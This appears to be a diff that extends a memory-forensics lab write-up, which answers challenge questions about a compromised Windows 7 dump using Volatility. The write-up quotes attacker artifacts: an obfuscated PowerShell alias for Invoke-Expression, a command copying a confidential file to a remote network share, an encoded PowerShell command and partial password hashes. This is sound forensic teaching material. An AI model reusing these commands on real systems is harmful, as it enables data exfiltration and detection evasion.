@@ -15,7 +15,7 @@ author: Julio
 
 ## Questions
 
-### What is the Operating System of the machine?
+### 1. What is the Operating System of the machine?
 
 <p>Judging my the scenario description, we are dealing with a memory dump. We can use a tool called "Volatility" to interact with it - we will be using both its version 2 and version 3. Assuming the memory dump was taken from a Windows machine, we can run the following command to get more information on the system:</p>
 
@@ -52,11 +52,11 @@ PE TimeDateStamp	Thu Aug  2 02:18:10 2018
 
 <p>We can see <custom-code>NTBuildLab	7601.24214.amd64fre.win7sp1_ldr_</custom-code>, which indicates that the right answer is <custom-code>Windows 7</custom-code>.</p>
 
-### When was the memory dump created?
+### 2. When was the memory dump created?
 
 <p>The previous command also answers this one. The dump time is the system time. The right answer is <custom-code>2022-12-19 16:07:30</custom-code>.</p>
 
-### After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?
+### 3. After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?
 
 <p>We can use Volatility 2 to retrieve the contents of the clipboard</p>
 
@@ -73,7 +73,7 @@ Session    WindowStation Format                         Handle Object           
 
 <p>The right answer is <custom-code>(gv '*MDR*').naMe[3,11,2]-joIN''</custom-code>.</p>
 
-### The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?
+### 4. The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?
 
 <p>We can run the following command to get more information on the console history.</p>
 
@@ -89,7 +89,7 @@ PS C:\Users\user>
 
 <p><custom-code>iex</custom-code> corresponds to <custom-code>Invoke-Expression</custom-code>, which is the right answer.</p>
 
-### A CMD command was executed to attempt to exfiltrate a file. What is the full command line?
+### 5. A CMD command was executed to attempt to exfiltrate a file. What is the full command line?
 
 <p>The same command executed above will iive us the answer:</p>
 
@@ -121,7 +121,7 @@ Cmd #2 at 0x9d1a0: powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2
 
 <p>The right answer is <custom-code>type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt</custom-code>.</p>
 
-### Following the above command, now tell us if the file was exfiltrated successfully?
+### 6. Following the above command, now tell us if the file was exfiltrated successfully?
 
 <p>The output of the above command will also tell us if the command was successful or not according to stdout.</p>
 
@@ -135,7 +135,7 @@ The network path was not found.
 
 <p>We can see that a network path was not found. Thus, the answer is <custom-code>NO</custom-code>.</p>
 
-### The attacker tried to create a readme file. What was the full path of the file?
+### 7. The attacker tried to create a readme file. What was the full path of the file?
 
 The output of the same command gives us the answer to this question:
 
@@ -154,7 +154,7 @@ echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
 
 <p>The right answer is <custom-code>C:\Users\Public\Office\readme.txt</custom-code>.</p>
 
-### What was the Host Name of the machine?
+### 8. What was the Host Name of the machine?
 
 <p>First, we will dump the hives:</p>
 
@@ -199,7 +199,7 @@ REG_SZ        ComputerName    : (S) USER-PC
 
 <p>The right answer is <custom-code>USER-PC</custom-code>.</p>
 
-### How many user accounts were in the machine?
+### 9. How many user accounts were in the machine?
 
 <p>We can run a hashdump command to retrieve hashes of all the users in the machine.</p>
 
@@ -214,7 +214,7 @@ HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:cb6003ecf6b98b5f7fbbb03df79
 
 <p>Since the question asks about user accounts, I will not be considering the Guest account. Thus, the right answer is <custom-code>3</custom-code>.</p>
 
-### In the "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?
+### 10. In the "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?
 
 <p>We can run the following command to scan for files and grep for the one we want:</p>
 
@@ -226,7 +226,7 @@ Volatility Foundation Volatility Framework 2.6
 
 <p>The right answer is <custom-code>\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt</custom-code>.</p>
 
-### A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?
+### 11. A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?
 
 <p>We can use the same command to retrieve the contents of the console history and we will find the following in the output:</p>
 
@@ -235,3 +235,145 @@ Cmd #5 at 0xc2ee0: .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c026
 ```
 
 <p>The right answer is <custom-code>b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1</custom-code>.</p>
+
+### 12. Following the previous question, what is the Imphash of the malicous file you found above?
+
+<p>If we look up the name of the file on VirusTotal, we can find the following:</p>
+
+```
+Imphash d3b592cd9481e4f053b5362e22d61595
+```
+
+<p>The right answer is <custom-code>d3b592cd9481e4f053b5362e22d61595</custom-code>.</p>
+
+### 13. Following the previous question, tell us the date in UTC format when the malicious file was created?
+
+VirusTotal also has the answer for this one under the details tab. The right answer is <custom-code>2022-06-22 11:49:04</custom-code>.
+
+### 14. What was the local IP address of the machine?
+
+<p>We can check for all network connections with the following command:</p>
+
+```bash
+./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 netscan
+Volatility Foundation Volatility Framework 2.6
+Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
+[...snip]
+0x11f8395c0        TCPv4    192.168.0.104:49323            199.232.46.132:443   ESTABLISHED      -1
+0x11fbd4570        TCPv4    192.168.0.104:49340            23.47.190.91:443     ESTABLISHED      -1
+0x11fbe1010        TCPv4    192.168.0.104:49326            198.144.120.23:80    CLOSED           -1
+0x11fd21cd0        TCPv4    192.168.0.104:49341            198.144.120.23:443   CLOSE_WAIT       -1
+0x11fd4b010        TCPv4    192.168.0.104:49325            198.144.120.23:80    CLOSED           -1
+```
+
+<p>We can see that the local ip and right answer is <custom-code>192.168.0.104</custom-code>.</p>
+
+### 15. There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?
+
+<p>We can run the following command to retrieve the process tree:</p>
+
+```bash
+./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 pstree
+Volatility Foundation Volatility Framework 2.6
+Name                                                  Pid   PPid   Thds   Hnds Time
+-------------------------------------------------- ------ ------ ------ ------ ----
+ 0xfffffa8005967060:explorer.exe                     2032   1988     23    906 2022-12-19 15:33:13 UTC+0000
+. 0xfffffa8003de2750:notepad.exe                     3476   2032      1     62 2022-12-19 15:50:42 UTC+0000
+[...snip]
+. 0xfffffa8003cbc060:cmd.exe                         4052   2032      1     23 2022-12-19 15:40:08 UTC+0000
+.. 0xfffffa8005abbb00:powershell.exe                 3532   4052      5    606 2022-12-19 15:44:44 UTC+0000
+```
+
+<p>As seen above, the parent process and right answer is <custom-code>cmd.exe</custom-code>.</p>
+
+### 16. Attacker might have used an email address to login a social media. Can you tell us the email address?
+
+We can use the Yara plugin to look for specific strings inside processes. We can run it and look for "gmail.com" or other famous .
+
+```bash
+./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 yarascan -Y "gmail.com"
+Volatility Foundation Volatility Framework 2.6
+Rule: r1
+Owner: Process msedge.exe Pid 2380
+0x070d37d7  67 6d 61 69 6c 2e 63 6f 6d 6d 61 66 69 61 5f 63   gmail.commafia_c
+0x070d37e7  6f 64 65 31 33 33 37 40 67 6d 61 69 6c 2e 63 6f   ode1337@gmail.co
+0x070d37f7  6d 63 a0 8b 5a 63 a0 8b 5a 0a 00 00 00 01 07 de   mc..Zc..Z.......
+0x070d3807  00 07 de 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
+[...snip]
+```
+
+<p>The right answer is <custom-code>mafia_code1337@gmail.com</custom-code>.</p>
+
+### 17. Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution's name?
+
+<p>Since the victim used MS Edge to search for a SIEM solution, we can try to find its history with the following command:</p>
+
+```bash
+./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 filescan | grep -i History
+Volatility Foundation Volatility Framework 2.6
+[...snip]
+0x000000011e0d16f0     17      1 RW-rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
+[...snip]
+```
+
+<p>Once we have the offset, we can dump the file from memory:</p>
+
+```bash
+./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 dumpfiles --dump-dir . -Q 0x000000011e0d16f0
+Volatility Foundation Volatility Framework 2.6
+DataSectionObject 0x11e0d16f0   None   \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
+SharedCacheMap 0x11e0d16f0   None   \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
+```
+
+<p>It will then generate a SQLite3 file that we can interact with and retrieve the searches:</p>
+
+```bash
+file file.None.0xfffffa80056d1440.dat
+file.None.0xfffffa80056d1440.dat: SQLite 3.x database, last written using SQLite version 3039004, file counter 5, database pages 40, cookie 0x1f, schema 4, UTF-8, version-valid-for 5
+
+sqlite3 file.None.0xfffffa80056d1440.dat
+SQLite version 3.43.2 2023-10-10 13:08:14
+Enter ".help" for usage hints.
+
+sqlite> .tables
+cluster_keywords          downloads                 segment_usage
+cluster_visit_duplicates  downloads_reroute_info    segments
+clusters                  downloads_slices          typed_url_sync_metadata
+clusters_and_visits       downloads_url_chains      urls
+content_annotations       keyword_search_terms      visit_source
+context_annotations       meta                      visits
+
+sqlite> select * from keyword_search_terms;
+2|5|install wazuh agent windows|install wazuh agent windows
+2|12|malwarebazaar|malwarebazaar
+2|21|malwarebazaar|malwarebazaar
+2|23|7 zip windows 10|7 zip windows 10
+2|24|7 zip windows 7|7 zip windows 7
+2|27|base64 encode|base64 encode
+sqlite>
+```
+
+<p>The right answer is <custom-code>Wazuh</custom-code>.</p>
+
+### 18. The victim user downloaded an exe file. The file's name was mimicking a legitimate binary from Microsoft with a typo (i.e. legitimate binary is powershell.exe and attacker named a malware as powershall.exe). Tell us the file name with the file extension?
+
+<p>We can use the following command to look for files in the Downloads directory:</p>
+
+```bash
+./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 filescan | grep -i Downloads
+Volatility Foundation Volatility Framework 2.6
+0x000000011dff8aa0      2      1 R--rwd \Device\HarddiskVolume2\Users\user\Downloads
+0x000000011e0ee070     16      0 R--rw- \Device\HarddiskVolume2\Users\user\Links\Downloads.lnk
+0x000000011e580e40     15      0 R--rwd \Device\HarddiskVolume2\Users\user\Downloads\desktop.ini
+0x000000011e7d1aa0      2      1 R--rwd \Device\HarddiskVolume2\Users\user\Downloads
+0x000000011e955820     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\csrsss.exe9541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.exe
+0x000000011ee95460     12      0 R--rw- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.zip
+0x000000011fa45c20     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
+0x000000011fc1db70      2      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
+0x000000011fd79a90     16      0 RW-rwd \Device\HarddiskVolume2\Users\user\Downloads\7z2201-x64.exe
+0x000000011fdbd560     16      0 R--rwd \Device\HarddiskVolume2\Users\Public\Downloads\desktop.ini
+0x000000011fdeb470     10      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\csrsss.exe9541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.exe
+0x000000011fe5b070     15      0 R--r-- \Device\HarddiskVolume2\Users\user\Downloads\bf9e9366489541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.zip
+```
+
+<p>The file <custom-code>csrsss.exe</custom-code> is suspicious since it appears to have an additional "s". This is the right answer.</p>
